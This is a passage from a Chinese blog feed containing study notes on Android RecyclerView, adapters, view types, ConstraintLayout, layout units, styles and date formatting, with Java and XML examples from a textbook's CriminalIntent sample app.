title="RecyclerView"></a>RecyclerView</h3><p><code>RecyclerView</code>是<code>ViewGroup</code>的子类，每一个列表项都是作为一个View子对象显示的。RecyclerView所做的就是回收再利用，循环往复</p><h3 id="ViewHolder"><a href="#ViewHolder" class="headerlink" title="ViewHolder"></a>ViewHolder</h3><p><code>ViewHolder</code>只做一件事：容纳View视图。如图：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/4.png" alt="4"></p><p><code>RecyclerView</code>自 身 不 会 创 建 视 图 ， 它 创 建 的 是 <code>ViewHolder</code>， 而 <code>ViewHolder</code> 引 用 着<code>itemView</code>：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/5.png" alt="5"></p><h3 id="Adapter"><a href="#Adapter" class="headerlink" title="Adapter"></a>Adapter</h3><p><code>Adapter</code>是一个控制器对象，从模型层获取数据，然后提供给<code>RecyclerView</code>显示，是沟通的桥梁</p><p>Adapter负责：</p><p>​    ①. 创建必要的<code>ViewHolder</code>；</p><p>​    ②. 绑定<code>ViewHolder</code>至模型层数据。</p><h3 id="使用RecyclerView"><a href="#使用RecyclerView" class="headerlink" title="使用RecyclerView"></a>使用RecyclerView</h3><ol><li><p><code>RecyclerView</code>类来自于Google支持库。要使用它，首先要添加<code>RecyclerView</code>依赖库。单击<code>File</code>→<code>Project Structure....</code>菜单项切换至项目结构窗口，选择左边的<code>app</code>模块，然后单击<code>Dependencies</code>选项页。单击<code>+</code>按钮弹出依赖库添加窗口。找到并选择<code>recyclerview-v7</code>支持库，单击OK按钮完成依赖库添加。如图：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/6.png" alt="6"></p></li><li><p>配置<code>CrimeListFragment</code>的视图文件，根视图使用<code>RecyclerView</code>。</p></li><li><p>修改<code>CrimeListFragment</code>类文件，使用布局并找到布局中的<code>RecyclerView</code>视图：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> View <span class="title">onCreateView</span><span class="params">(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">View v = inflater.inflate(R.layout.fragment_crime_list, container, <span class="keyword">false</span>);</span><br><span class="line">mCrimeRecyclerView = v.findViewById(R.id.crime_recycler_view);</span><br><span class="line">mCrimeRecyclerView.setLayoutManager(<span class="keyword">new</span> LinearLayoutManager(getActivity()));</span><br><span class="line"><span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，没有<code>LayoutManager</code>的支持，不仅<code>RecyclerView</code>无法工作，还会导致应用崩溃。所以， <code>RecyclerView</code>视图创建完成后，就立即转交给了<code>LayoutManager</code>对象。</p><p><code>LayoutManager</code>负责在屏幕上摆放列表项和定义屏幕滚动行为。</p><p>这里使用的是<code>LinearLayoutManager</code>类，它支持以竖直列表的形式展示列表项；还有<code>GridLayoutManager</code>类，以网格形式展示列表项。</p><p>到这里运行应用，看到的是一个<code>RecyclerView</code>空视图。要显示出crime列表项，还需要完成<code>Adapter</code>和<code>ViewHolder</code>的实现</p></li></ol><h3 id="列表项视图"><a href="#列表项视图" class="headerlink" title="列表项视图"></a>列表项视图</h3><p>新建列表项的布局文件<code>list_item_crime</code></p><h3 id="实现-ViewHolder-和-Adapter"><a href="#实现-ViewHolder-和-Adapter" class="headerlink" title="实现 ViewHolder 和 Adapter"></a>实现 ViewHolder 和 Adapter</h3><p>到这一步发现了一些书中的问题，书中说到：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/7.png" alt="7" style="zoom:50%;"></p><p>但在我使用的Android Studio 3.5中，自动生成的构造方法却是一个参数的：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/8.png" alt="8"></p><p>这是为什么呢？因为Google将实例化 <code>list_item_crime</code> 布局的过程挪到了之后实现 <code>Adapter</code> 的<code>onCreateViewHolder</code> 方法。也就是说，我们需要做的就是将书中原本在 <code>CrimeHolder</code>实例化 <code>list_item_crime</code> 的过程挪到 <strong><code>onCreateViewHolder</code></strong> 方法之中</p><p>代码如下：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/9.png" alt="9" style="zoom: 80%;"></p><p>接下来创建<code>Adapter</code>，需要显示新创建的<code>ViewHolder</code>或让<code>Crime</code>对象和已创建的<code>ViewHolder</code>关联时， <code>RecyclerView</code>会去找<code>Adapter</code>（调用它的方法）。 <code>RecyclerView</code>不关心也不了解具体的<code>Crime</code>对象，这是<br><code>Adapter</code>要做的事</p><p>接下来，在<code>CrimeAdapter</code>中实现三个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@NonNull</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CrimeHolder <span class="title">onCreateViewHolder</span><span class="params">(@NonNull ViewGroup viewGroup, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    View view = LayoutInflater.from(getActivity()).inflate(R.layout.list_item_crime, viewGroup, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> CrimeHolder(view);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBindViewHolder</span><span class="params">(@NonNull CrimeHolder crimeHolder, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getItemCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mCrimes.size();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(注意：<code>onCreateViewHolder</code>方法已经添加了上文的修改内容)</p><p><code>RecyclerView</code>需要新的<code>ViewHolder</code>来显示列表项时，会调用<code>onCreateViewHolder</code>方法。在这个方法内部，我们创建一个<code>LayoutInflater</code>，然后用它创建<code>CrimeHolder</code></p><p>搞定了Adapter，最后要做的就是将它和<code>RecyclerView</code>关联起来。实现一个设置<code>CrimeListFragment</code>用户界面的<code>updateUI</code>方法，该方法创建<code>CrimeAdapter</code>，然后设置给<code>RecyclerView</code></p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/10.png" alt="10"></p><h2 id="绑定列表项"><a href="#绑定列表项" class="headerlink" title="绑定列表项"></a>绑定列表项</h2><p><code>CrimeHolder</code>还需要一个<code>bind(Crime)</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Crime mCrime;</span><br><span class="line">···</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(Crime crime)</span></span>&#123;</span><br><span class="line">mCrime = crime;</span><br><span class="line">mTitleTextView.setText(crime.getTitle());</span><br><span class="line">mDateTextView.setText(crime.getDate().toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次有新的<code>Crime</code>要在<code>CrimeHolder</code>中显示时，都要调用它一次，并在<code>Adapter</code>中的<code>onbindViewHolder</code>方法中使用它：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBindViewHolder</span><span class="params">(@NonNull CrimeHolder crimeHolder, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">Crime crime = mCrimes.get(i);</span><br><span class="line">crimeHolder.bind(crime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后运行效果将会显示每个Crime的Title和Date</p><h2 id="响应点击"><a href="#响应点击" class="headerlink" title="响应点击"></a>响应点击</h2><p>我们通过修改<code>CrimeHolder</code>类来处理用户点击事件:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeHolder</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">ViewHolder</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">···</span><br><span class="line">        <span class="keyword">private</span> Crime mCrime;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">CrimeHolder</span><span class="params">(@NonNull View itemView)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(itemView);</span><br><span class="line">            ···</span><br><span class="line">            itemView.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            Toast.makeText(getActivity(),mCrime.getTitle() + <span class="string">"Clicked"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="挑战练习：-RecyclerView-ViewType"><a href="#挑战练习：-RecyclerView-ViewType" class="headerlink" title="挑战练习： RecyclerView ViewType"></a>挑战练习： RecyclerView ViewType</h2><p>请在<code>RecyclerView</code>中创建两类列表项：一般性crime，以及需警方介入的crime。要完成这个<br>挑战，你需要用到<code>RecyclerView.Adapter</code>的视图类别功能（ view type）。在Crime对象里，再添<br>加一个<code>mRequiresPolice</code>实例变量，使用它并借助<code>getItemViewType(int)</code>方法（ <a href="https://developer.android.com/reference/android/support/v7/widget/RecyclerView.Adapter.html#getItemViewType(int)），确定该加载哪个视图到`CrimeAdapter`。" target="_blank" rel="noopener">https://developer.android.com/reference/android/support/v7/widget/RecyclerView.Adapter.html#getItemViewType(int)），确定该加载哪个视图到`CrimeAdapter`。</a><br>在<code>onCreateViewHolder(ViewGroup, int)</code>方法里，基于<code>getItemViewType(int)</code>方法返回的<code>viewType</code>值，需要返回不同的<code>ViewHolder</code>。如果是一般性crime，就仍然使用原始布局；如果是需警方介入的crime，就使用一个带联系警方按钮的新布局</p><ol><li><p>新建需警方介入的<code>crime</code>列表项视图<code>list_item_crime_police</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:padding</span>=<span class="string">"8dp"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">"vertical"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/crime_title"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">"Crime Title"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/crime_date"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">"Crime Date"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"20dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">"right"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"#ff0000"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Police"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在<code>Crime</code>类中添加是否报警的属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 是否报警</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> mRequiresPolice;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isRequiresPolice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mRequiresPolice;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRequiresPolice</span><span class="params">(<span class="keyword">boolean</span> requiresPolice)</span> </span>&#123;</span><br><span class="line">    mRequiresPolice = requiresPolice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在<code>CrimeLab</code>中设置每隔3项需要报警：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">CrimeLab</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">mCrimes = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        Crime crime = <span class="keyword">new</span> Crime();</span><br><span class="line">        crime.setTitle(<span class="string">"Crime # "</span> + i);</span><br><span class="line">        crime.setSolved(i % <span class="number">2</span> == <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 设置每隔2项需要报警</span></span><br><span class="line">        crime.setRequiresPolice(i % <span class="number">3</span> == <span class="number">0</span>);</span><br><span class="line">        mCrimes.add(crime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>修改<code>CrimeListFragment</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除泛型</span></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeAdapter</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">Adapter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Crime&gt; mCrimes;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CrimeAdapter</span><span class="params">(List&lt;Crime&gt; crimes)</span> </span>&#123;</span><br><span class="line">        mCrimes = crimes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getItemViewType</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mCrimes.get(position).isRequiresPolice())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NonNull</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RecyclerView.<span class="function">ViewHolder <span class="title">onCreateViewHolder</span><span class="params">(@NonNull ViewGroup viewGroup, <span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">        View view;</span><br><span class="line">        <span class="comment">// 分情况展示视图</span></span><br><span class="line">        <span class="keyword">if</span> (type == <span class="number">0</span>)&#123;</span><br><span class="line">            view = LayoutInflater.from(getActivity()).inflate(R.layout.list_item_crime, viewGroup, <span class="keyword">false</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            view = LayoutInflater.from(getActivity()).inflate(R.layout.list_item_crime_police, viewGroup, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CrimeHolder(view);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBindViewHolder</span><span class="params">(@NonNull RecyclerView.ViewHolder viewHolder, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        Crime crime = mCrimes.get(i);</span><br><span class="line">        ((CrimeHolder) viewHolder).bind(crime);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getItemCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mCrimes.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>最终效果：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/11.jpg" alt="11" style="zoom:50%;"></p></li></ol><h1 id="第九章-使用布局与组件创建用户界面"><a href="#第九章-使用布局与组件创建用户界面" class="headerlink" title="第九章 使用布局与组件创建用户界面"></a>第九章 使用布局与组件创建用户界面</h1><h2 id="引入ConstraintLayout"><a href="#引入ConstraintLayout" class="headerlink" title="引入ConstraintLayout"></a>引入ConstraintLayout</h2><h3 id="约束编辑器"><a href="#约束编辑器" class="headerlink" title="约束编辑器"></a>约束编辑器</h3><p><img src="/2020/03/30/Android编程权威指南学习笔记二/12.jpg" alt="12" style="zoom: 67%;"></p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/13.jpg" alt="13" style="zoom: 67%;"></p><p><code>TextView</code>水平方向和竖直方向的尺寸是分别由宽度设置和高度设置决定的。能设置的值有以下三种：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/14.jpg" alt="14"></p><h3 id="约束的XML形式"><a href="#约束的XML形式" class="headerlink" title="约束的XML形式"></a>约束的XML形式</h3><p>凡是以layout_开头的属性都属于布局参数（ layout parameter）。与其他属性不同的是，组件的布局参数是用来向其父组件做指示的，即用于告诉父布局如何安排自己，如<code>layout_width</code>和<code>layout_height</code></p><h2 id="深入学习布局属性"><a href="#深入学习布局属性" class="headerlink" title="深入学习布局属性"></a>深入学习布局属性</h2><h3 id="dp、-sp-以及屏幕像素密度"><a href="#dp、-sp-以及屏幕像素密度" class="headerlink" title="dp、 sp 以及屏幕像素密度"></a>dp、 sp 以及屏幕像素密度</h3><ul><li>px：    英文pixel的缩写，即像素。无论屏幕密度多少，一个像素单位对应一个屏幕像素单位。不推荐使用px，因为它不会根据屏幕密度自动缩放</li><li>dp（或dip）：英文density-independent pixel的缩写，意为密度无关像素。在设置边距、内边距或任何不<br>打算按像素值指定尺寸的情况下，通常都使用dp这种单位。如果屏幕密度较高，密度无关像素会相应扩展至整个屏幕。 1dp在设备屏幕上总是等于1/160英寸。使用dp的好处是，无论屏幕密度如何，总能获得同样的尺寸</li><li>sp：英文scale-independent pixel的缩写， 意为缩放无关像素。它是一种与密度无关的像素，这种像素会受用户字体偏好设置的影响。通常使用sp来设置屏幕上的字体大小</li><li>pm、mm、in：类似于dp的缩放单位，允许以点（ 1/72英寸）、毫米或英寸为单位指定用户界面尺寸。但<br>在实际开发中不建议使用这些单位，因为并非所有设备都能按照这些单位进行正确的尺寸缩放配置  </li></ul><h3 id="样式、主题及主题属性"><a href="#样式、主题及主题属性" class="headerlink" title="样式、主题及主题属性"></a>样式、主题及主题属性</h3><p>样式（ style）是XML资源文件，含有用来描述组件行为和外观的属性定义。例如，使用下列<br>样式配置组件，就能显示比正常大小更大的文字：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"BigTextStyle"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"android:textSize"</span>&gt;</span>20sp<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"android:padding"</span>&gt;</span>3dp<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>你可以创建自己的样式文件（第22章会这样做）。具体做法是将属性定义添加并保存在<code>res/values/</code>目录下的样式文件中，然后在布局文件中以<code>@style/my_own_style（样式文件名）</code>的形式引用</p><p>主题是各种样式的集合。从结构上来说，主题本身也是一种样式资源，只不过它的属性指向了其他样式资源。Android自带了一些供应用使用的平台主题。</p><p>使用主题属性引用，可将预定义的应用主题样式添加给指定组件</p><h3 id="Android-应用的设计原则"><a href="#Android-应用的设计原则" class="headerlink" title="Android 应用的设计原则"></a>Android 应用的设计原则</h3><p>边距属性， Android Studio默认使用的值是16dp或8dp。设定这两种值遵循了Android的material design原则。访问<a href="https://developer.android.com/design/index.html，可看到所有的Android设计规范。" target="_blank" rel="noopener">https://developer.android.com/design/index.html，可看到所有的Android设计规范。</a></p><p>开发Android应用都应严格遵循这些设计原则。不过，这些设计原则严重依赖于SDK较新版本的功能，旧版本设备往往无法获得或实现这些功能。不过有些设计可借助<code>AppCompat</code>库实现，详见第13章</p><h2 id="挑战练习：日期格式化"><a href="#挑战练习：日期格式化" class="headerlink" title="挑战练习：日期格式化"></a>挑战练习：日期格式化</h2><p>与其说<code>Date</code>对象是普通日期，不如说是时间戳。调用<code>Date</code>对象的<code>toString()</code>方法，就能得到一个时间戳。所以， <code>RecyclerView</code>视图上显示的就是它。时间戳虽然凑合能用，但如果能显示人们习惯看到的日期应该会更好，如“ Jul 22, 2016” 。要实现此目标，可使用<code>android.text.format.DateFormat</code>类实例。具体怎么用，请查阅Android文档库中有关该类的说明。<br>使用<code>DateFormat</code>类中的方法，可获得常见格式的日期；也可以自己定制字符串格式。最后，<br>再来一个更有挑战的练习：创建一个包含星期的字符串格式，如“Friday, Jul 22, 2016”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(Crime crime)</span></span>&#123;</span><br><span class="line">    mCrime = crime;</span><br><span class="line">    mTitleTextView.setText(crime.getTitle());</span><br><span class="line">    <span class="comment">// 格式化日期   //星期，月份 几号，几年   例如：星期一，三月 30 2020</span></span><br><span class="line">    CharSequence date = DateFormat.format(<span class="string">"EEEE,MMMM dd yyyy"</span>, crime.getDate());</span><br><span class="line">    mDateTextView.setText(date);</span><br><span class="line">    mSolvedImageView.setVisibility(mCrime.isSolved() ? View.VISIBLE : View.GONE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行效果</strong></p><p><img src="/2020/03/30/Android编程权威指南学习笔记二/15.jpg" alt="image-20200330182711213" style="zoom: 50%;"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上一篇笔记记录了学习《Android编程权威指南》的第1-7章，由于内容较多，所以以后将分成多篇文章记录学习内容。这篇文章将记录第8-9章的学习内容&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android开发" scheme="https://blog.suqir.xyz/categories/Android%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>今日校园自动签到</title>
    <link href="https://blog.suqir.xyz/2020/03/25/%E4%BB%8A%E6%97%A5%E6%A0%A1%E5%9B%AD%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0/"/>
    <id>https://blog.suqir.xyz/2020/03/25/%E4%BB%8A%E6%97%A5%E6%A0%A1%E5%9B%AD%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0/</id>
    <published>2020-03-25T13:18:18.000Z</published>
    <updated>2020-03-31T15:34:05.218Z</updated>
    
